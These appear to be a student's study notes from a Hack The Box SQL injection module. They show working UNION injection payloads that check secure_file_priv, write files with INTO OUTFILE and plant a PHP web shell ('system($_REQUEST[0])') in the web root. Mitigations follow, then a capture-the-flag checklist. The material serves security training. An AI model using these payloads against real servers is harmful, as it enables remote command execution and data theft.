As we are using a UNION injection, we have to get the value using a SELECT statement. This shouldn't be a problem, as all variables and most configurations' are stored within the INFORMATION_SCHEMA database. MySQL global variables are stored in a table called global_variables, and as per the documentation, this table has two columns variable_name and variable_value.

We have to select these two columns from that table in the INFORMATION_SCHEMA database. There are hundreds of global variables in a MySQL configuration, and we don't want to retrieve all of them. We will then filter the results to only show the secure_file_priv variable, using the WHERE clause we learned about in a previous section.
```
Original Query
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"

UNION Query
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```
If the result shows that the secure_file_priv value is empty, it means that we can read/write files to any location.

### SELECT INTO OUTFILE
The SELECT INTO OUTFILE statement can be used to write data from select queries into files. This is usually used for exporting data from tables.

To use it, we can add INTO OUTFILE '...' after our query to export the results into the file we specified. The below example saves the output of the users table into the /tmp/credentials file:
```
SELECT * from users INTO OUTFILE '/tmp/credentials';

thossa00@htb[/htb]$ cat /tmp/credentials 

1       admin   392037dbba51f692776d6cefb6dd546d
2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
```
It is also possible to directly SELECT strings into files, allowing us to write arbitrary files to the back-end server.
```
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';

thossa00@htb[/htb]$ ls -la /tmp/test.txt 

-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt
```

## Writing Files through SQL Injection
To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use load_file to read the server configuration, like Apache's configuration found at /etc/apache2/apache2.conf, Nginx's configuration at /etc/nginx/nginx.conf, or IIS configuration at %WinDir%\System32\Inetsrv\Config\ApplicationHost.config, or we can search online for other possible configuration locations.

```
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```
### Writing a Web Shell
Having confirmed write permissions, we can go ahead and write a PHP web shell to the webroot folder. We can write the following PHP webshell to be able to execute commands directly on the back-end server:
```
<?php system($_REQUEST[0]); ?>

cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -

then navigate to http://SERVER_IP:PORT/shell.php?0= with whatever linux command you want (ls, id, cat, pwd, ls ..) URL encoding allows spaces in the URL.
```
If we don't see any errors, it means the file write probably worked. This can be verified by browsing to the /shell.php file and executing commands via the 0 parameter, with ?0=id in our URL.

# Mitigating SQL Injection
## Input Sanitization
Injection can be avoided by sanitizing any user input, rendering injected queries useless. Libraries provide multiple functions to achieve this, one such example is the mysqli_real_escape_string() function. This function escapes characters such as ' and ", so they don't hold any special meaning.
```
<SNIP>
$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = mysqli_real_escape_string($conn, $_POST['password']);

$query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
echo "Executing query: " . $query . "<br /><br />";
<SNIP>
```

## Input Validation
User input can also be validated based on the data used to query to ensure that it matches the expected input. For example, when taking an email as input, we can validate that the input is in the form of ...@email.com, and so on.

A regular expression can be used for validating the input:
```
<SNIP>
$pattern = "/^[A-Za-z\s]+$/";
$code = $_GET["port_code"];

if(!preg_match($pattern, $code)) {
  die("</table></div><p style='font-size: 15px;'>Invalid input! Please try again.</p>");
}

$q = "Select * from ports where port_code ilike '%" . $code . "%'";
<SNIP>
```
The code is modified to use the preg_match() function, which checks if the input matches the given pattern or not. The pattern used is [A-Za-z\s]+, which will only match strings containing letters and spaces. Any other character will result in the termination of the script.

## User Privileges
As discussed initially, DBMS software allows the creation of users with fine-grained permissions. We should ensure that the user querying the database only has minimum permissions, like SELECT only privileges to query a database.

Superusers and users with administrative privileges should never be used with web applications. These accounts have access to functions and features, which could lead to server compromise.

## Web Application Firewall
Web Application Firewalls (WAF) are used to detect malicious input and reject any HTTP requests containing them. This helps in preventing SQL Injection even when the application logic is flawed. WAFs can be open-source (ModSecurity) or premium (Cloudflare). Most of them have default rules configured based on common web attacks. For example, any request containing the string INFORMATION_SCHEMA would be rejected, as it's commonly used while exploiting SQL injection.

## Parameterized Queries
Another way to ensure that the input is safely sanitized is by using parameterized queries. Parameterized queries contain placeholders for the input data, which is then escaped and passed on by the drivers. Instead of directly passing the data into the SQL query, we use placeholders and then fill them with PHP functions.
```
<SNIP>
  $username = $_POST['username'];
  $password = $_POST['password'];

  $query = "SELECT * FROM logins WHERE username=? AND password = ?" ;
  $stmt = mysqli_prepare($conn, $query);
  mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
  mysqli_stmt_execute($stmt);
  $result = mysqli_stmt_get_result($stmt);

  $row = mysqli_fetch_array($result);
  mysqli_stmt_close($stmt);
<SNIP>
```
The query is modified to contain two placeholders, marked with ? where the username and password will be placed. We then bind the username and password to the query using the mysqli_stmt_bind_param() function. This will safely escape any quotes and place the values in the query.

# Final Assessment

1. Bypass authentication with OR statement and comment
2. Confirm number of columns in table through union injection.
3. Check database version for right queries.
4. Check database schema to confirm database names.
5. Check current user permissions.
6. Read global file like /etc/passwd
7. Write file to current directory (check URL for current directory) /var/www/html/'current directory'
8. Create a web shell to gain access to the system.
9. Navigate to root directory to find flag.
